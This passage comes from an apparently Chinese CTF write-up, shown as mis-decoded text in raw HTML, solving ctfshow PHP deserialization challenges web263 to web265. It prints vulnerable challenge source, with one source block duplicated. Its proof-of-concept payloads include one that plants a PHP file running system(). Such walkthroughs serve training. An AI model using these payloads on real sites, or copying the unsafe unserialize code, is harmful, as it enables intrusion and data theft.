href="https://www.yuque.com/attachments/yuque/0/2021/zip/2789727/1616392581642-23859f77-d323-4bdf-b5cc-862753f23d09.zip">ğŸ“www.zip</a></p><p>é€šè¿‡ <code>/www.zip</code> æ‰«æåˆ°æºç ï¼Œè¿™é‡Œç›®å½•æ‰«æå…¨æ˜¯ 200ï¼Œå»ºè®®ä½¿ç”¨å¯ä»¥çœ‹åˆ°è¿”å›åŒ…å¤§å°çš„æ‰«æå™¨ï¼Œæˆ–è€…æœ‰ 404 é¡µé¢è¯†åˆ«çš„æ‰«æå™¨ï¼Œæ¯”å¦‚ dirmap</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616383532005-925e83c0-512b-4390-85c4-8387ca46d9a9.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616383532005-925e83c0-512b-4390-85c4-8387ca46d9a9.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>æ—¥å¸¸åæ§½ fortifyï¼Œå’‹å•¥ä¹Ÿæ‰«ä¸å‡ºæ¥ (x</p><p>seay å‘ç° file_put_contents è¾“å…¥å¯æ§</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616383372458-c7207443-0771-4791-8c9e-8af0572edff8.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616383372458-c7207443-0771-4791-8c9e-8af0572edff8.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>åˆ©ç”¨å‰æï¼š</p><p>åˆ©ç”¨ç‚¹æ˜¯ <code>session.serialize_handler</code> ä¸ php.ini çš„é…ç½®ä¸åŒå¼•èµ·çš„ååºåˆ—åŒ–ï¼Œè‡³äºä¸ºä»€ä¹ˆä¸åŒï¼Œå¦‚æœç›¸åŒçš„ä¹Ÿå°±æ²¡å¿…è¦åŠ ä¸Šè¿™å¥è®¾ç½®äº†ï¼ˆ<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code>ï¼‰ï¼Œæ¯•ç«Ÿæ˜¯é»˜è®¤é…ç½®å¯¹å§</p><p>ç›®æ ‡ï¼š</p><ul><li><code>file_put_contents</code> å¯æ§ç‚¹åœ¨ <code>inc/inc.php</code> åœ¨ <code>User</code> ç±»ï¼Œå¯ä»¥é€šè¿‡ååºåˆ—åŒ–è§¦å‘ <code>__destruct</code></li></ul><p>æ€è·¯ï¼š</p><ul><li>é¦–å…ˆè®¿é—®ä¸¤æ¬¡é¦–é¡µï¼ŒæŠ“åŒ…å¯ä»¥çœ‹åˆ°<code>Cookie</code> <code>limit</code> å‚æ•°ï¼Œæ„é€  exp ï¼Œä½¿å¾—æˆ‘ä»¬çš„ååºåˆ—åŒ–æ•°æ®å†™å…¥ session æ–‡ä»¶ï¼ˆé€šè¿‡ <code>$_SESSION[&#39;limit&#39;]=base64_decode($_COOKIE[&#39;limit&#39;]);</code> å†™å…¥ï¼Œè¿™æ˜¯PHP session æœºåˆ¶ï¼Œå¯å‚è€ƒ <a href="https://xz.aliyun.com/t/6640">æ­¤é“¾æ¥</a>ï¼‰</li><li>å›  <code>inc/inc.php</code>  å­˜åœ¨  <code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code> å’Œ <code>session_start();</code> ï¼Œåªè¦è®¿é—®å³ä¼šè·å–ä¹‹å‰å†™å…¥çš„ <code>session</code> æ•°æ®ï¼Œç„¶å <code>check.php</code> åŒ…å« <code>inc/inc.php</code> ï¼Œå³ä¼šè§¦å‘ <code>Userç±»</code> çš„ <code>__destructæ–¹æ³•</code> ï¼Œä»è€ŒæŠŠæ¶æ„æ•°æ®é€šè¿‡ <code>file_put_contents</code> å†™å…¥åä¸º <code>log-$this.username</code> ï¼Œå†…å®¹ä¸º <code>$this.password</code> çš„æ–‡ä»¶ã€‚</li></ul><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;tari.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;&lt;?php system(&quot;cat flag.php&quot;) ?&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> User();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(base64_encode(<span class="string">&#x27;|&#x27;</span>.serialize(<span class="variable">$user</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡ŒåŠ  <code>&#39;|&#39;</code> æ˜¯å› ä¸º <code>session.serialize_handler</code> ä½¿ç”¨ <code>phpå¼•æ“</code> ï¼Œsession å…³è”æ•°ç»„çš„ <code>key</code> å’Œ <code>value</code> æ˜¯é€šè¿‡ <code>&#39;|&#39;</code> åŒºåˆ†çš„ï¼Œ <code>value</code> æ˜¯éœ€è¦è¢«ååºåˆ—åŒ–çš„éƒ¨åˆ†ã€‚ç„¶åé»˜è®¤ä¸æ˜¯ç”¨ php å¼•æ“ï¼Œæ‰€ä»¥â€¦. æ‰€ä»¥å†™å…¥æ˜¯æ­£å¸¸å­—ç¬¦ä¸²ï¼Œåœ¨ <code>inc/inc.php</code> è¿™è¯»å–è¯­ä¹‰åˆä¸ä¸€æ ·äº†ã€‚</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617611777418-faa713aa-f4e2-41a4-ae7b-cb80b0738090.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617611777418-faa713aa-f4e2-41a4-ae7b-cb80b0738090.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>éšä¾¿è¯·æ±‚ä¸€ä¸‹ check.php</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617611797635-345ee197-41a2-4255-9462-dcb895a00449.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617611797635-345ee197-41a2-4255-9462-dcb895a00449.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>æ³¨æ„æ˜¯ <code>log-tari.php</code> !</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617611816637-8f34127a-223a-4c94-9f86-c1a9a0a88cee.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617611816637-8f34127a-223a-4c94-9f86-c1a9a0a88cee.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web264-å­—ç¬¦é€ƒé€¸"><a href="#web264-å­—ç¬¦é€ƒé€¸" class="headerlink" title="web264 å­—ç¬¦é€ƒé€¸"></a>web264 å­—ç¬¦é€ƒé€¸</h2><span class='btn'><a class="button"  title='PHP/5.6.40'><i class='fas fa-tag'></i>PHP/5.6.40</a></span> <span class='btn'><a class="button"  title='å­—ç¬¦é€ƒé€¸'><i class='fas fa-tag'></i>å­—ç¬¦é€ƒé€¸</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 02:37:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 16:05:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@message</span>.php</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> message(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = str_replace(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, serialize(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=base64_encode(<span class="variable">$umsg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>çœ‹æ³¨é‡Šå‘ç° message.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 15:13:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 15:17:17</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">session_start();</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = unserialize(base64_decode(<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹æ³¨é‡Šå‘ç° message.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 15:13:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 15:17:17</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">session_start();</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = unserialize(base64_decode(<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€å¼€å§‹æ²¡çœ‹å‡ºå’Œ web262 æœ‰å•¥åŒºåˆ«ï¼Œä»”ç»†çœ‹äº†ä¸€ä¸‹å‘ç°ï¼Œååºåˆ—åŒ–æ—¶ä½¿ç”¨äº† session è€Œä¸æ˜¯ç›´æ¥é€šè¿‡ Cookie æ¥æ”¶</p><p>åšæ³•å’Œ web262ä¸­ç¬¬äºŒç§åšæ³•ä¸€æ ·ï¼Œè™½ç„¶ä¸æ˜¯é€šè¿‡ Cookie æ¥æ”¶ï¼Œä¹Ÿåˆ«å¿˜äº†äº† Cookie çš„ msg å­—æ®µé™„åŠ ä¸ªå€¼ï¼Œä¸ç„¶ä¸æ»¡è¶³</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br></pre></td></tr></table></figure><p>å…ˆè¯·æ±‚ <code>index.php</code> ï¼ˆè¿™é‡Œ poc ä¸æ˜ç™½æ€ä¹ˆæ„é€ çœ‹ä¸€ä¸‹ web262 ç¬¬äºŒç§åšæ³•ï¼‰</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617612288933-93722641-a0ee-4b58-87d0-346f427957cf.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617612288933-93722641-a0ee-4b58-87d0-346f427957cf.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>å› ä¸º PHP çš„ <code>session</code> æ˜¯é€šè¿‡ Cookie é‡Œçš„ <code>PHPSESSID</code> è·å–çš„ï¼ˆä¸æ¸…é™¤å‚è€ƒ web263 session ä¼ªé€ ï¼‰ï¼Œæ‰€ä»¥è¦è®°å½•ä¸‹æ¥ï¼Œç„¶ååœ¨ <code>message.php</code> é‡Œå¸¦ä¸Šã€‚</p><p>ç„¶åè¯·æ±‚ä¸€ä¸‹ <code>message.php</code> , åˆ«å¿˜äº† <code>Cookie</code> éƒ¨åˆ†</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617612374091-4ef0cf55-ca51-4973-b405-49ccef2fdefa.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617612374091-4ef0cf55-ca51-4973-b405-49ccef2fdefa.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web265-å˜é‡å¼•ç”¨"><a href="#web265-å˜é‡å¼•ç”¨" class="headerlink" title="web265 å˜é‡å¼•ç”¨"></a>web265 å˜é‡å¼•ç”¨</h2><span class='btn'><a class="button"  title='PHP/5.6.40'><i class='fas fa-tag'></i>PHP/5.6.40</a></span> <span class='btn'><a class="button"  title='å˜é‡å¼•ç”¨'><i class='fas fa-tag'></i>å˜é‡å¼•ç”¨</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-04 23:52:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;token===<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=md5(mt_rand());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;login())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>token ä¼šå˜ï¼Œè®© password æˆä¸º token çš„å¼•ç”¨å°±å¥½äº†</p><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$admin</span> = <span class="keyword">new</span> ctfshowAdmin();</span><br><span class="line"><span class="variable">$admin</span>-&gt;password = &amp;<span class="variable">$admin</span>-&gt;token;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(urlencode(serialize(<span class="variable">$admin</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616399516360-f6f77f35-27ec-4eff-95e1-27eefaf58af8.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616399516360-f6f77f35-27ec-4eff-95e1-27eefaf58af8.png?x-oss-process=image/resize,w_1500" 